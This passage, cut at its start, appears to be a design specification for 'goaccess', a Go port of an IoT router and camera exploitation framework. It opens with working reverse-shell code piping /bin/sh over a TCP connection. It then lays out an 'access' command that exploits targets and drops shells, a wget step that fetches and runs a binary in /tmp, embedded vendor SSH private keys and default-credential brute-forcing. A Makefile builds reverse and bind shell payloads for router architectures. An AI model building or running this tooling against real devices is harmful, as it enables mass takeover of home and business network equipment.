    var conn net.Conn
    var err error
    for i := 0; i < 30; i++ {
        conn, err = net.Dial("tcp", net.JoinHostPort(host, port))
        if err == nil {
            break
        }
        time.Sleep(2 * time.Second)
    }
    if conn == nil {
        os.Exit(1)
    }

    cmd := exec.Command("/bin/sh")
    cmd.Stdin = conn
    cmd.Stdout = conn
    cmd.Stderr = conn
    cmd.Run()
}
```

### 7.3 Cross-Compilation Targets

| Arch     | GOARCH  | GOARM / GOMIPS | Typical IoT Device                                |
|----------|---------|----------------|---------------------------------------------------|
| ARMv5    | arm     | GOARM=5        | Old routers (Linksys, older D-Link)               |
| ARMv7    | arm     | GOARM=7        | Modern routers (TP-Link Archer, Raspberry Pi)     |
| ARM64    | arm64   | —              | Newer high-end routers, SBCs                      |
| MIPS     | mips    | GOMIPS=softfloat | Big-endian MIPS routers (Ubiquiti, MikroTik)     |
| MIPSLE   | mipsle  | GOMIPS=softfloat | Little-endian MIPS routers (D-Link, TP-Link)     |
| MIPS64   | mips64  | GOMIPS=softfloat | 64-bit MIPS routers                              |
| x86      | 386     | —              | x86 embedded systems, old NAS boxes               |
| x86_64   | amd64   | —              | x86_64 embedded systems, modern NAS              |

---

## 8. CLI Design (`cmds/goaccess/main.go`)

### 8.1 Subcommands (stdlib `flag`)

```text
goaccess identify <target>          Fingerprint target hardware
goaccess scan <target>              Scan for vulnerabilities
goaccess access <target>            Actively exploit + gain access
goaccess list <resource>            List registered exploits, creds, payloads, keys
```

### 8.2 Identify

```text
goaccess identify 192.168.1.1
goaccess identify 192.168.1.1 --json
goaccess identify 192.168.1.1 --oui-only
goaccess identify 192.168.1.1 --verbose
```

### 8.3 Scan

```text
goaccess scan 192.168.1.1
goaccess scan 192.168.1.1 --vendor dlink
goaccess scan 192.168.1.1 --type router
goaccess scan 192.168.1.1 --threads 32
goaccess scan 192.168.1.1 --timeout 10s
goaccess scan 192.168.1.1 --skip-creds
goaccess scan 192.168.1.1 --skip-exploits
goaccess scan 192.168.1.1 --json --output results.json
goaccess scan 192.168.1.1 --verbose
```

### 8.4 Access

```text
goaccess access 192.168.1.1
goaccess access 192.168.1.1 --threads 16
goaccess access 192.168.1.1 --payload arm       # Prefer ARM reverse shell
goaccess access 192.168.1.1 --listen :4444       # Listen for reverse shells
goaccess access 192.168.1.1 --shell              # Drop to interactive shell on success
goaccess access 192.168.1.1 --no-exploit         # Creds-only (safe mode)
goaccess access 192.168.1.1 --no-creds           # Exploit-only (skip creds)
goaccess access 192.168.1.1 --output access.json
goaccess access 192.168.1.1 --verbose
```

### 8.5 List

```text
goaccess list exploits
goaccess list exploits --vendor dlink
goaccess list creds --vendor dlink
goaccess list payloads
goaccess list keys
goaccess list vendors
```

### 8.6 Flag Implementation Pattern

```go
func main() {
    if len(os.Args) < 2 {
        printUsage()
        os.Exit(1)
    }

    switch os.Args[1] {
    case "identify":
        cmdIdentify(os.Args[2:])
    case "scan":
        cmdScan(os.Args[2:])
    case "access":
        cmdAccess(os.Args[2:])
    case "list":
        cmdList(os.Args[2:])
    default:
        printUsage()
        os.Exit(1)
    }
}

func cmdIdentify(args []string) {
    fs := flag.NewFlagSet("identify", flag.ExitOnError)
    json := fs.Bool("json", false, "Output as JSON")
    ouiOnly := fs.Bool("oui-only", false, "Only show OUI vendor lookup")
    verbose := fs.Bool("verbose", false, "Verbose output")
    // ...
    fs.Parse(args)
    // ...
}
```

---

## 9. Protocol Helpers (`protocols/`)

### 9.1 Protocol Client Pattern

Each protocol package exports a concrete Client struct that can be embedded into exploit structs:

```go
// protocols/http/http.go
package http

type Client struct {
    Target  string
    Port    int
    SSL     bool
    Timeout time.Duration
    Verbose bool
}

func NewClient() *Client { ... }

func (c *Client) Get(path string, headers map[string]string) (*Response, error) { ... }
func (c *Client) Post(path string, body []byte, headers map[string]string) (*Response, error) { ... }
func (c *Client) Head(path string) (*Response, error) { ... }
func (c *Client) Do(method, path string, body []byte, headers map[string]string) (*Response, error) { ... }
func (c *Client) SetBasicAuth(user, pass string) { ... }
func (c *Client) GetTargetURL(path string) string { ... }
```

Similarly for `tcp.Client`, `udp.Client`, `ssh.Client`, `telnet.Client`, `ftp.Client`, `snmp.Client`.

### 9.2 Pure Go Dependencies

| Protocol | Go Package | Notes |
|----------|------------|-------|
| HTTP/HTTPS | `net/http` (stdlib) | Full stdlib HTTP client |
| TCP | `net` (stdlib) | Raw socket |
| UDP | `net` (stdlib) | Raw socket |
| SSH | `golang.org/x/crypto/ssh` | Pure Go SSH |
| Telnet | Custom (stdlib `net`) | Pure Go telnet implementation |
| FTP | `github.com/jlaffaye/ftp` | Pure Go FTP client |
| SNMP | `github.com/gosnmp/gosnmp` | Pure Go SNMP |

All are CGO-free (pure Go), compatible with `CGO_ENABLED=0`.

---

## 10. Shell Handler (`shell/`)

### 10.1 Shell Handler

```go
package shell

// Handler manages reverse and bind shells.
type Handler struct {
    Architecture string          // "arm", "mipsle", etc.
    Method       string          // "wget", "echo", "cmd"
    Location     string          // "/tmp" (where to drop payload)
    Payload      []byte          // ELF binary payload
    LHOST        string
    LPORT        int
    RHOST        string
    RPORT        int
    executeFn    func(string) (string, error)  // execute command on target
}

func NewHandler(arch, method, location string) *Handler
func (h *Handler) DeployReverse() (*ShellSession, error)
func (h *Handler) DeployBind() (*ShellSession, error)
func (h *Handler) SetExecuteFunc(fn func(string) (string, error))
```

### 10.2 Deployment Methods

**wget**: Serve payload via embedded HTTP server → `wget http://lhost:lport/path -qO /tmp/binary` → `chmod +x /tmp/binary; /tmp/binary; rm /tmp/binary`

**echo**: Chunk binary into hex → transfer via `echo -ne "\xNN..." >> /tmp/binary` loops → execute

**cmd**: RCE exploit's `Execute()` is called directly for each command (no binary payload needed)

### 10.3 TCP Listener (for reverse shells)

```go
package shell

type Listener struct {
    Host    string
    Port    int
    Timeout time.Duration
}

func (l *Listener) Listen() (net.Listener, error)
func (l *Listener) Accept() (net.Conn, error)
func (l *Listener) ServePayload(payload []byte) error  // HTTP server for wget
func (l *Listener) Close() error
```

---

## 11. OUI Database (`oui/`)

### 11.1 Lookup

```go
package oui

//go:embed oui.dat
var ouiData string

// Lookup resolves a MAC address to vendor name.
// Example: Lookup("00:50:BA:12:34:56") → "D-Link"
func Lookup(mac string) string

// LookupAll returns all known OUI prefixes for a vendor.
func LookupAll(vendor string) []string

// Parse loads the OUI database into memory (called once at init).
func Parse() map[string]string
```

---

## 12. Wordlists (`wordlist/`)

### 12.1 Embedding + API

```go
package wordlist

import (
    _ "embed"
    "github.com/cookiengineer/goaccess/types"
)

//go:embed defaults.txt
var defaultsData string

//go:embed passwords.txt
var passwordsData string

//go:embed usernames.txt
var usernamesData string

//go:embed snmp.txt
var snmpData string

// Defaults returns known default credential pairs (user:pass).
func Defaults() []types.Credential

// Passwords returns common passwords (one per line, no username).
func Passwords() []string

// Usernames returns common usernames (one per line).
func Usernames() []string

// SNMP returns common SNMP community strings.
func SNMPCommunities() []string

// Iterator provides a thread-safe wordlist iterator for brute-force modules.
type Iterator struct { ... }

func NewIterator(creds []types.Credential) *Iterator
func (it *Iterator) Next() (types.Credential, bool)
```

---

## 13. SSH Keys (`ssh_keys/`)

### 13.1 Key Registry

```go
package ssh_keys

import "embed"

//go:embed generic/*/*.key generic/*/*.json
//go:embed fortinet/*/*.key fortinet/*/*.json
//go:embed f5/*/*.key f5/*/*.json
//go:embed barracuda/*/*.key barracuda/*/*.json
//go:embed exagrid/*/*.key exagrid/*/*.json
//go:embed quantum/*/*.key quantum/*/*.json
//go:embed array_networks/*/*.key array_networks/*/*.json
//go:embed ceragon/*/*.key ceragon/*/*.json
//go:embed monroe/*/*.key monroe/*/*.json
//go:embed loadbalancer/*/*.key loadbalancer/*/*.json
var KeysFS embed.FS

// KeyEntry represents a known hardcoded SSH key.
type KeyEntry struct {
    Vendor   string // "fortinet"
    Model    string // "fortigate"
    Username string // "Fortimanager_Access"
    KeyData  []byte // PEM-encoded private key
    Type     string // "RSA", "DSA"
    CVE      string // "CVE-2016-1909" (if applicable)
}

// All returns all registered SSH key entries.
func All() []KeyEntry

// ByVendor returns SSH keys for a specific vendor.
func ByVendor(vendor string) []KeyEntry

// ByVendorModel returns SSH keys for a specific vendor+model.
func ByVendorModel(vendor, model string) (*KeyEntry, error)
```

---

## 14. Payload System (`payload/`)

### 14.1 Embedded Payload Registry

```go
package payload

import "embed"

//go:embed arm/reverse_tcp arm/bind_tcp
//go:embed arm64/reverse_tcp arm64/bind_tcp
//go:embed mips/reverse_tcp mips/bind_tcp
//go:embed mipsle/reverse_tcp mipsle/bind_tcp
//go:embed mips64/reverse_tcp mips64/bind_tcp
//go:embed x86/reverse_tcp x86/bind_tcp
//go:embed x86_64/reverse_tcp x86_64/bind_tcp
var PayloadFS embed.FS

// GetPayload returns the pre-compiled payload binary for the given arch and handler.
// arch: "arm", "arm64", "mips", "mipsle", "mips64", "x86", "x86_64"
// handler: "reverse_tcp", "bind_tcp"
func GetPayload(arch Arch, handler Handler) ([]byte, error)

// List returns all available (arch, handler) combinations.
func List() []PayloadInfo

// Arch represents a target CPU architecture.
type Arch string
const (
    ARM    Arch = "arm"
    ARM64  Arch = "arm64"
    MIPS   Arch = "mips"
    MIPSLE Arch = "mipsle"
    MIPS64 Arch = "mips64"
    X86    Arch = "x86"
    X86_64 Arch = "x86_64"
)

// Handler represents a shell connection type.
type Handler string
const (
    ReverseTCP Handler = "reverse_tcp"
    BindTCP    Handler = "bind_tcp"
)

type PayloadInfo struct {
    Arch    Arch
    Handler Handler
    Size    int64
    Path    string
}
```

---

## 15. Report Formatting (`report/`)

### 15.1 Output Helpers

```go
package report

import "github.com/cookiengineer/goaccess/types"

type Report struct {
    JSON     bool
    Verbose  bool
    Output   io.Writer
}

func NewReport(json, verbose bool, output io.Writer) *Report

// Status messages
func (r *Report) Info(format string, args ...interface{})
func (r *Report) Success(format string, args ...interface{})
func (r *Report) Error(format string, args ...interface{})
func (r *Report) Warn(format string, args ...interface{})
func (r *Report) Status(format string, args ...interface{})

// Structured output
func (r *Report) Table(headers []string, rows [][]string)
func (r *Report) KeyValue(pairs map[string]string)
func (r *Report) Fingerprint(fp *types.FingerprintResult)
func (r *Report) ScanResult(result *types.ScanResult)
func (r *Report) AccessResult(result *types.AccessResult)
func (r *Report) JSONOutput(v interface{})
```

---

## 16. LZS Decompression Library (`libs/lzs/`)

### 16.1 Port from Python

The LZS (Lempel-Ziv-Stac) decompression algorithm used by RomPager/ZyNOS ROM-0 exploits:

```go
package lzs

// Decompress decompresses LZS-compressed data.
// Used by rom-0 exploits to extract plaintext credentials from compressed ROM files.
func Decompress(data []byte) ([]byte, error)

// DecompressChunk decompresses starting at a specific offset.
func DecompressChunk(data []byte, offset int) ([]byte, error)
```

---

## 17. First Exploit Module Template

```go
// exploits/routers/dlink/dir_300_600_rce/exploit.go
package dir_300_600_rce

import (
    "github.com/cookiengineer/goaccess/exploit"
    "github.com/cookiengineer/goaccess/interfaces"
    "github.com/cookiengineer/goaccess/protocols/http"
    "github.com/cookiengineer/goaccess/types"
)

type Exploit struct {
    http *http.Client
}

func init() {
    exploit.Register(&Exploit{
        http: http.NewClient(),
    })
}

func (e *Exploit) Info() *types.Info {
    return &types.Info{
        Name:        "D-Link DIR-300/600 RCE",
        Description: "Exploits D-Link DIR-300 and DIR-600 remote code execution via HNAP SOAP action header injection.",
        Vendor:      "dlink",
        DeviceType:  types.DeviceRouter,
        Models:      []string{"DIR-300", "DIR-600"},
        CVE:         []string{"CVE-2013-XXXX"},
        References:  []string{
            "http://www.s3cur1ty.de/home-network-horror-days",
            "http://www.s3cur1ty.de/m1adv2013-003",
        },
    }
}

func (e *Exploit) Options() *types.Options {
    return &types.Options{
        Port:    80,
        Timeout: 10 * time.Second,
    }
}

func (e *Exploit) Protocol() types.Protocol {
    return types.ProtocolHTTP
}

func (e *Exploit) Fingerprints() []*types.Fingerprint {
    return []*types.Fingerprint{
        {URL: "/HNAP1/", Method: "GET", Body: "GetDeviceSettings"},
        {UPnPResponse: "Linux, UPnP/1.0, DIR-"},
        {MACPrefixes: []string{"00:50:BA", "1C:AF:F7", "F0:7D:68"}},
    }
}

func (e *Exploit) Check(target string, opts *types.Options) (*types.VulnResult, error) {
    // ... implementation
}

func (e *Exploit) Run(target string, opts *types.Options) (*types.ExploitResult, error) {
    // ... implementation
}

func (e *Exploit) Execute(cmd string) (string, error) {
    // ... implementation (if RCE)
}

// Verify interface compliance
var _ interfaces.Exploit = (*Exploit)(nil)
var _ interfaces.ExecuteExploit = (*Exploit)(nil)
```

---

## 18. Creds Module Template (Vendor-Specific)

```go
// exploits/routers/dlink/creds/telnet_default.go
package creds

import (
    "github.com/cookiengineer/goaccess/exploit"
    "github.com/cookiengineer/goaccess/interfaces"
    "github.com/cookiengineer/goaccess/protocols/telnet"
    "github.com/cookiengineer/goaccess/types"
)

// DLinkTelnetDefaults is exported so other packages can use D-Link's defaults.
// These can be overridden per-model by defining additional exported vars.
var DLinkTelnetDefaults = []string{
    "admin:admin",
    "1234:1234",
    "root:12345",
    "root:root",
}

type TelnetDefault struct {
    client *telnet.Client
}

func init() {
    exploit.RegisterCreds(&TelnetDefault{
        client: telnet.NewClient(),
    })
}

func (e *TelnetDefault) Info() *types.Info { ... }
func (e *TelnetDefault) Options() *types.Options { ... }
func (e *TelnetDefault) Protocol() types.Protocol { ... }
func (e *TelnetDefault) Fingerprints() []*types.Fingerprint { return nil }
func (e *TelnetDefault) Check(target string, opts *types.Options) (*types.VulnResult, error) {
    // Test if telnet is reachable
}
func (e *TelnetDefault) Run(target string, opts *types.Options) (*types.ExploitResult, error) {
    // Run interactive credential brute-force
}
func (e *TelnetDefault) CheckDefault(target string, opts *types.Options) ([]*types.CredsResult, error) {
    // Silent credential check for scanner
}

var _ interfaces.CredsModule = (*TelnetDefault)(nil)
```

---

## 19. Password Generator Template (Vendor-Specific)

```go
// exploits/routers/dlink/creds/password_generator.go
package creds

import (
    "fmt"
    "regexp"
    "strings"

    "github.com/cookiengineer/goaccess/exploit"
    "github.com/cookiengineer/goaccess/interfaces"
    "github.com/cookiengineer/goaccess/types"
)

// DLinkWPAKeyGen generates WPA keys for D-Link routers
// based on the known algorithm: MAC-derived WPA passphrase.
type DLinkWPAKeyGen struct{}

func init() {
    exploit.RegisterPasswordGenerator(&DLinkWPAKeyGen{})
}

func (g *DLinkWPAKeyGen) Name() string {
    return "D-Link WPA Default Key Generator"
}

func (g *DLinkWPAKeyGen) Vendor() string {
    return "dlink"
}

func (g *DLinkWPAKeyGen) Generate(mac, serial, model string) []types.Credential {
    // Example: D-Link DIR-300 default WPA key is last 8 chars of MAC
    // without colons, uppercase
    if mac == "" {
        return nil
    }
    clean := strings.ToUpper(strings.ReplaceAll(mac, ":", ""))
    if len(clean) < 8 {
        return nil
    }
    return []types.Credential{
        {Username: "admin", Password: clean[len(clean)-8:]},
    }
}

var _ interfaces.PasswordGenerator = (*DLinkWPAKeyGen)(nil)
```

---

## 20. Auto-Import Mechanism

### 20.1 `exploits/imports.go`

This file contains blank imports for every exploit package, ensuring their `init()` functions run:

```go
package exploits

import (
    // Generic exploits
    _ "github.com/cookiengineer/goaccess/exploits/generic/creds"
    _ "github.com/cookiengineer/goaccess/exploits/generic/heartbleed"
    _ "github.com/cookiengineer/goaccess/exploits/generic/shellshock"
    _ "github.com/cookiengineer/goaccess/exploits/generic/tcp_32764/rce"
    _ "github.com/cookiengineer/goaccess/exploits/generic/tcp_32764/info_disclosure"
    _ "github.com/cookiengineer/goaccess/exploits/generic/rom_0"
    _ "github.com/cookiengineer/goaccess/exploits/generic/gpon_home_gateway"

    // Router exploits - D-Link
    _ "github.com/cookiengineer/goaccess/exploits/routers/dlink/creds"
    _ "github.com/cookiengineer/goaccess/exploits/routers/dlink/dir_300_600_rce"
    _ "github.com/cookiengineer/goaccess/exploits/routers/dlink/dir_300_645_815_upnp_rce"
    // ... all other dlink exploits

    // Router exploits - TP-Link
    _ "github.com/cookiengineer/goaccess/exploits/routers/tplink/creds"
    _ "github.com/cookiengineer/goaccess/exploits/routers/tplink/archer_c2_c20i_rce"
    // ... all other tplink exploits

    // ... etc for all vendors
)
```

### 20.2 CLI Integration

The `cmds/goaccess/main.go` imports `exploits` package to trigger registration:

```go
package main

import (
    _ "github.com/cookiengineer/goaccess/exploits"
    // This single import triggers all init() registrations
)
```

---

## 21. Key Design Decisions

| Decision | Rationale |
|----------|-----------|
| **stdlib-only CLI** | No cobra dependency; flag-based subcommands keep binary small |
| **CGO_ENABLED=0** | Single static binary, no glibc dependency, run anywhere |
| **go:embed for all data** | OUI, wordlists, payloads, SSH keys — all embedded at compile time |
| **interfaces/ + types/ separation** | All interfaces in one place, all data types in one place; clean dependency graph |
| **init() registration** | No runtime module discovery needed; each exploit self-registers |
| **Composition over inheritance** | Protocol clients are embedded structs, not base classes |
| **Channel-based scanning** | Idiomatic Go: buffered channels + goroutine pools for parallel exploit checks |
| **Self-contained exploits** | Each `exploits/<vendor>/<model>/<cve>/` package is standalone with all data, payloads, and fingerprints |
| **Exported vars for creds** | Credential lists are Go vars, enabling per-model overrides and generator functions |
| **Access priority ordering** | RCE + shell first (best), credential dumping second (fallback) |

---

## 22. Testing Strategy

### 22.1 Unit Tests

- Every protocol client gets tests with mock servers (net.Listen + mock responses)
- Every exploit's Check() gets tests against captured HTTP/TCP responses (mock or recorded)
- OUI Lookup gets table-driven tests
- Wordlist iterators get concurrency tests
- LZS decompression gets golden file tests (known input → known output)
- Version comparison gets exhaustive comparison tests

### 22.2 Integration Tests

- Scanner pipeline with mock exploits
- Access pipeline with mock credential checks
- CLI subcommand parsing
- Payload cross-compilation success

### 22.3 Test Naming Convention

```
exploit_test.go      — tests for exploit.go
http_test.go         — tests for protocols/http/http.go
lzs_test.go          — tests for libs/lzs/lzs.go
```

---

## 23. Dependencies (go.mod)

```
module github.com/cookiengineer/goaccess

go 1.21

require (
    golang.org/x/crypto v0.x.x     // SSH client (pure Go)
    github.com/jlaffaye/ftp v0.x.x  // FTP client (pure Go)
    github.com/gosnmp/gosnmp v1.x.x // SNMP client (pure Go)
)
```

All three are CGO-free (pure Go). Zero C dependencies.

---

## 24. Build Targets (Makefile)

```makefile
.PHONY: all build payloads clean test lint

all: build

build:
    CGO_ENABLED=0 go build -ldflags="-s -w" -o bin/goaccess ./cmds/goaccess

payloads:
    # ARM
    GOOS=linux GOARCH=arm GOARM=5 CGO_ENABLED=0 go build -ldflags="-s -w" -o payload/arm/reverse_tcp cmds/rshell/main.go
    GOOS=linux GOARCH=arm GOARM=5 CGO_ENABLED=0 go build -ldflags="-s -w" -o payload/arm/bind_tcp cmds/rshell/main.go
    # ARM64
    GOOS=linux GOARCH=arm64 CGO_ENABLED=0 go build -ldflags="-s -w" -o payload/arm64/reverse_tcp cmds/rshell/main.go
    GOOS=linux GOARCH=arm64 CGO_ENABLED=0 go build -ldflags="-s -w" -o payload/arm64/bind_tcp cmds/rshell/main.go
    # MIPS big-endian
    GOOS=linux GOARCH=mips GOMIPS=softfloat CGO_ENABLED=0 go build -ldflags="-s -w" -o payload/mips/reverse_tcp cmds/rshell/main.go
    GOOS=linux GOARCH=mips GOMIPS=softfloat CGO_ENABLED=0 go build -ldflags="-s -w" -o payload/mips/bind_tcp cmds/rshell/main.go
    # MIPS little-endian
    GOOS=linux GOARCH=mipsle GOMIPS=softfloat CGO_ENABLED=0 go build -ldflags="-s -w" -o payload/mipsle/reverse_tcp cmds/rshell/main.go
    GOOS=linux GOARCH=mipsle GOMIPS=softfloat CGO_ENABLED=0 go build -ldflags="-s -w" -o payload/mipsle/bind_tcp cmds/rshell/main.go
    # MIPS64
    GOOS=linux GOARCH=mips64 GOMIPS=softfloat CGO_ENABLED=0 go build -ldflags="-s -w" -o payload/mips64/reverse_tcp cmds/rshell/main.go
    GOOS=linux GOARCH=mips64 GOMIPS=softfloat CGO_ENABLED=0 go build -ldflags="-s -w" -o payload/mips64/bind_tcp cmds/rshell/main.go
    # x86
    GOOS=linux GOARCH=386 CGO_ENABLED=0 go build -ldflags="-s -w" -o payload/x86/reverse_tcp cmds/rshell/main.go
    GOOS=linux GOARCH=386 CGO_ENABLED=0 go build -ldflags="-s -w" -o payload/x86/bind_tcp cmds/rshell/main.go
    # x86_64
    GOOS=linux GOARCH=amd64 CGO_ENABLED=0 go build -ldflags="-s -w" -o payload/x86_64/reverse_tcp cmds/rshell/main.go
    GOOS=linux GOARCH=amd64 CGO_ENABLED=0 go build -ldflags="-s -w" -o payload/x86_64/bind_tcp cmds/rshell/main.go

test:
    CGO_ENABLED=0 go test ./...

lint:
    go vet ./...

clean:
    rm -rf bin/ payload/arm/ payload/arm64/ payload/mips/ payload/mipsle/ payload/mips64/ payload/x86/ payload/x86_64/
```

---

## 25. File Naming Conventions

| Convention | Example |
|---|---|
| Folder names: lowercase, underscores | `dir_300_600_rce/`, `archer_c2_c20i_rce/` |
| Go file named after primary struct: UpperCasedStruct.go | `Exploit` struct → `exploit.go` |
| Go file named after primary function: Function.go | `Lookup` func → `lookup.go` |
| Tests next to subject: Subject_test.go | `exploit_test.go`, `oui_test.go`, `lzs_test.go` |
| Package name: lowercase, matches folder | `package dir_300_600_rce` |
| Struct: PascalCase | `type Exploit struct` |
| Exported vars: PascalCase | `var DLinkTelnetDefaults []string` |
| Creds folders: `creds/` (always lowercase) | `exploits/routers/dlink/creds/` |
| Creds files: `service_default.go` | `telnet_default.go`, `ssh_default.go` |
| Fingerprint data: `fingerprints.go` (optional) | `exploits/routers/dlink/dir_300_600_rce/fingerprints.go` |

---

## 26. Implementation Quality Requirements

### 26.1 Non-Stub Implementations

All implementations MUST be complete, functional implementations. Stub implementations that silently return nil or trivial values are considered FAILED. Specifically:

- Every protocol client MUST implement all documented methods with correct behavior
- Every exploit MUST implement Info(), Check(), Run(), Options(), Protocol() with real logic
- Every credentials module MUST implement CheckDefault() with actual service authentication attempts
- Every scanner phase MUST perform real network operations (fingerprinting, checking, credential testing)

Placeholder functions like `return nil, nil` or `// TODO: implement` are NOT acceptable except where explicitly noted for incomplete exploit modules.

### 26.2 Unit Test Requirements

Every implementation MUST have accompanying unit tests. Tests must:

- Verify correct behavior for valid inputs (success cases)
- Verify correct behavior for invalid inputs (error cases, edge cases)
- Verify interface compliance where applicable (compile-time interface checks)
- Use `net/http/httptest`, `net.Listen`, `net.ListenUDP`, or mock implementations for network-dependent tests
- NOT require external network access to pass (all tests must pass offline with `CGO_ENABLED=0 go test ./...`)
- Be named `*_test.go` and reside in the same package directory as the code under test

### 26.3 Integration Tests with Podman Containers

Integration tests that require a real service stack (SSH, FTP, SNMP, Telnet servers) SHOULD use Podman containers to spin up ephemeral service instances. This applies to:

- **SSH**: Test against OpenSSH server in a container (e.g., `docker.io/linuxserver/openssh-server`)
- **FTP**: Test against vsftpd in a container (e.g., `docker.io/fauria/vsftpd`)
- **SNMP**: Test against snmpd in a container (e.g., `docker.io/polinux/snmpd`)
- **Telnet**: Test against telnetd in a container (e.g., `docker.io/alpine` with `busybox-extras`)

Integration test files should be named `*_integration_test.go` and use build tags:

```go
//go:build integration
// +build integration

package ssh

func TestLogin_RealServer(t *testing.T) {
    // Start podman container, test Login(), tear down
}
```

Run integration tests with:

```bash
go test -tags=integration ./protocols/ssh/
```

### 26.4 Implementation Acceptance Criteria

A task is considered COMPLETE when:

1. The implementation file(s) exist and compile with `CGO_ENABLED=0 go build ./...`
2. Unit tests exist in a corresponding `*_test.go` file
3. All unit tests pass with `CGO_ENABLED=0 go test ./...`
4. `go vet ./...` produces no warnings
5. The implementation is NOT a stub (no `// TODO` placeholders, no `return nil, nil` without real logic)
6. Where applicable, integration tests exist (see §26.3)
7. The PROGRESS.md file is updated with the implementation and test counts

---

## 27. Current Implementation Status (as of latest build)

| Metric | Value |
|--------|-------|
| Exploit modules | 142 (all routersploit exploits ported) |
| Credential modules | 165 (all routersploit creds ported) |
| Vendors covered | 43 |
| Total packages | 222 |
| Total tests | 1,327 |
| Test failures | 0 |
| CGO_ENABLED | 0 (pure Go static binary) |
| go vet warnings | 0 |
| CredentialedExploit interface | 142/142 exploits implemented |
| Binary size | ~20MB (stripped with -ldflags="-s -w") |
| Dependencies | 3 (golang.org/x/crypto, jlaffaye/ftp, gosnmp/gosnmp — all pure Go) |

**Protocol coverage:** HTTP, HTTPS, TCP, UDP, SSH, Telnet, FTP, SNMP
**Device types:** Router (106 exploits), Camera (21 exploits), Misc (8 exploits), Generic (7 exploits)
**Credential coverage:** Router (27 vendors × 3), Camera (25 vendors × 3), Generic (9 modules)
**Phases complete:** 1 (Foundation), 2 (Scanner), 3 (CLI + Shell), 4 (Initial Exploits), 5 (Full Coverage)
